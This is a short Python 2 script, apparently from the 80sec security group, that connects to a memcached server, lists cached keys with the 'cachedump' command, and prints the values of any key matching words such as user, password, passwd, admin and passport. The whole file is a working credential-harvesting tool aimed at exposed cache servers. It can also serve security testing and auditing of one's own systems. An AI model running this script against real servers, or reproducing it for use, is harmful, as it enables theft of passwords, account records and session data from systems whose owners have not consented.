#!/usr/bin/env python 
#coding=utf-8 
#Author: wofeiwo#80sec.com 
#Just filter sensitive information form a memcache server 

import memcache 
import re,sys 
from pprint import pprint 

MAX_NUM   = 100 
RE_STRING = "user|account|config|password|passwd|admin|manage|member|passport" # 这里选择你所需要过滤的关键词 

def isImportant(word): 
    pattern = re.compile(RE_STRING, re.I) 
    return pattern.search(word) 

def main(args): 
    if len(args) != 2: 
        print "Usage: %s <memcached_host:port>" % args[0] 
        sys.exit(-1) 
    elif args[1] in ["-h", "--help", "/?"]: 
        print "Usage: %s <memcached_host:port>" % args[0] 
        sys.exit(-1) 

    mc = memcache.Client([args[1]]) 

    slabs = {} 
    if not mc.get_slabs(): 
        print "[-] Error: Server not correct or empty items." 
        print "[-] Exiting.." 
        sys.exit(-2) 

    for k,v in mc.get_slabs()[0][1].items(): 
        slabs[k] = v["number"] 

    for k,v in slabs.items(): 
        if v < MAX_NUM: # 如果数量太多,只提取部分内容进行判断. 
            tmp = mc.get_stats("cachedump " + str(k) + ' ' + "0")[0][1] 
        else: 
            tmp = mc.get_stats("cachedump " + str(k) + ' ' + str(MAX_NUM))[0][1] 

        result = {} 
        for w in tmp: 
            if isImportant(w): 
                try: 
                    result[w] = mc.get(w) 
                except: 
                    continue 

        if result: 
            pprint(result) 


if __name__ == "__main__" : main(sys.argv)